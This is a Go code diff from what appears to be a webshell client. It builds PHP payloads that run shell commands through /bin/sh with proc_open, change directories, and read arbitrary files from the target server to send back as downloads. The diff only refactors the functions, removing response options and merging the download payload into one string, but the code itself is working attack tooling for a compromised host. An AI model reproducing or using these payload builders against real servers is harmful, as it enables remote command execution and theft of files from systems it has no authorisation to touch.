@@ -33,7 +33,7 @@ func _getProcOpenCMD(cmd, scope, proc, letter string) string {
 	return o
 }
 
-func CreateCMD(cmd, scope, method string, response bool, opt ...string) string {
+func CreateCMD(cmd, scope, method string) string {
 	var contexter, shellCMD string
 
 	if scope != "" {
@@ -52,42 +52,34 @@ func CreateCMD(cmd, scope, method string, response bool, opt ...string) string {
 		shellCMD = _getProcOpenCMD(cmd, scope, "/bin/sh", "r")
 	}
 
-	if response && len(opt) > 1 {
-		shellCMD += CreateAnswer(opt[0], opt[1])
-	}
-
 	return shellCMD
 }
 
-func CreateCD(cmd, scope, method string, response bool, opt ...string) string {
+func CreateCD(cmd, scope, method string) string {
 	var cd string
 
 	cd = cmd + " && pwd"
-	cd = CreateCMD(cd, scope, method, response, opt...)
+	cd = CreateCMD(cd, scope, method)
 
 	return cd
 }
 
-func CreateDownload(dir string, response bool, opt ...string) string {
-	var ifstr, endifstr, headers, cmd string
+func CreateDownload(dir string) string {
+	var php string
 
-	ifstr = "if (file_exists('" + dir + "')) {"
-	endifstr = "}"
-	headers = `header('Content-Description: File Transfer');
-    header('Content-Type: application/octet-stream');
-    header('Content-Transfer-Encoding: binary');
-    header('Expires: 0');
-    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
-    header('Pragma: public');`
-	headers = headers + "header('Content-Length: ' . filesize('" + dir + "'));" + "header('Content-Disposition: attachment; filename='.basename('" + dir + "'));"
+	php = `if(file_exists('` + dir + `')){
+		header('Content-Description: File Transfer');
+    	header('Content-Type: application/octet-stream');
+    	header('Content-Transfer-Encoding: binary');
+    	header('Expires: 0');
+    	header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
+    	header('Pragma: public');
+		header('Content-Length: ' . filesize('` + dir + `'));
+		header('Content-Disposition: attachment; filename='.basename('` + dir + `'));
+		ob_clean();flush();readfile('` + dir + `');exit();
+	}`
 
-	cmd = ifstr + headers + "ob_clean();flush();readfile('" + dir + "');exit();" + endifstr
-
-	if response && len(opt) > 1 {
-		cmd += CreateAnswer(opt[0], opt[1])
-	}
-
-	return cmd
+	return php
 }
 
 func CreateUpload(path, dir string, raw bool) (string, *bytes.Buffer, error) {
